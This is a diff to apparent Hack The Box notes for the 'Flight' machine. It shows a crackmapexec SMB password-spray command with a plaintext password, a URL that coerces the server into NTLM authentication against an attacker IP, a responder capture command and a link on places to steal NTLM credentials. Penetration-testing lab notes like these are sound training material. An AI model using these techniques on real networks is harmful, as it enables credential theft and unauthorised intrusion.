@@ -218,7 +218,8 @@ ntpdate IP
 date
 ```
 Try password on user list:
- User Spray```s
+ User Spray
+ ```s
 crackmapexec smb flight.htb -u ../users.txt -p 'S@Ss!K@*t13' --continue-on-success
 ```
 
@@ -245,6 +246,8 @@ http://school.flight.htb/index.php?view=//10.10.16.82/test
 ```s
 responder -I tun0 -wPv
 ```
+### Places to steal ntlm
+https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
 
 
 ## Host share server
